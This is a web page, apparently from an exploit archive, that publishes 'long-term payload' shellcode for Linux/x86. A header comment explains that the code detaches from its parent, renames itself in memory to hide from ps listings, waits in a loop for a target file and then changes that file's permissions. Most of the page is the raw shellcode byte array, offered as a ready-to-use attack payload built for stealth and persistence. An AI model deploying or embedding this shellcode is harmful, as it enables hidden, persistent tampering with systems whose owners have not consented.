<html><head><title>Linux/x86 - examples of long-term payloads hide-wait-change - 187 bytes+</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*----------------------------------------------------------------------------*
 *          [Mystique Project: Examples of long-term payloads]                *
 *                       hide-wait-change code                                *
 *                 by xort@tty64.org  &amp;  izik@tty64.org                       *
 *----------------------------------------------------------------------------*
 * This code, upon execution, will perform the following things...            *
 *                                                                            *
 *   1) Fork a new process, and kill PPID via _exit() so we get inherrited    *
 *      by init and now have a new PID.                                       *
 *   2) Will obtain the current location of argv[0] by retrieving information *
 *      from /proc/self/stat.                                                 *
 *   3) Copy the name we wish to masquarade as into argv[0] in memory.        *
 *   4) Call setsid() to establish ourselfs as a process leader.              *
 *   5) Will sleep via nanosleep() for a givin interval of time.              *
 *   6) Will check to see if a file exist via access().                       *
 *   7) If it does not Loop back to step 5                                    *
 *   8) If it does then we chmod() the file with permissions 0455.            *
 *   9) Calls _exit()                                                         *
 *                                                                            *
 *  * steps 3-4 effectivly hide us from most ps-listings                      *
 *                                                                            *
 *   size: 187 + strlen(new-proc-name) + strlen(file-to-change)               *
 *----------------------------------------------------------------------------*/
	
char shellcode[]=
&quot;\x6a\x02\x58\xcd\x80\x85\xc0\x74\x79\x31\xc0\x40\xcd\x80\x5b\x8d&quot;
&quot;\x73\x10\xfe\x43\x0f\x99\x31\xc9\xb0\x05\xcd\x80\x93\x6a\x03\x58&quot;
&quot;\xb2\xfa\x89\xe1\x29\xd1\xcd\x80\x89\xcf\x01\xc7\x93\xfd\x6a\x20&quot;
&quot;\x58\x6a\x0e\x59\x87\xcb\xf2\xae\x87\xcb\xe2\xf8\x47\x47\x31\xc0&quot;
&quot;\x6a\x0a\x5b\xfc\x31\xd2\x8a\x0f\x83\xe9\x30\x01\xc8\x47\x80\x3f&quot;
&quot;\x20\x74\x04\xf7\xe3\xeb\xed\x94\x5f\x5f\x94\x57\xb1\xff\x31\xc0&quot;
&quot;\xf3\xaa\x5f\x56\x4e\x46\x41\x80\x3e\xff\x75\xf9\xfe\x06\x5e\xf3&quot;
&quot;\xa4\xb0\x42\xcd\x80\x89\xf7\x92\x48\x89\xc1\xf2\xae\xfe\x47\xff&quot;
&quot;\xff\xe7\xe8\x87\xff\xff\xff&quot;
&quot;/proc/self/stat\xff&quot;                       // 
&quot;xort and izik rocks the linux box\xff&quot;     // new proc name
&quot;/tmp/foo\xff&quot;                              // file to chmod
&quot;\x6a&quot;                                      //
&quot;\x03&quot;                                      // sleep-time
&quot;\x40\x89\xe1\x89\xe3\x34\xa2\xcd\x80\x31\xc9\x89\xf3\x34\x21\xcd&quot;
&quot;\x80\x85\xc0\x75\xeb\xb0\x0f\x66\xb9\x6d\x09\xcd\x80\x40\xcd\x80&quot;;



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
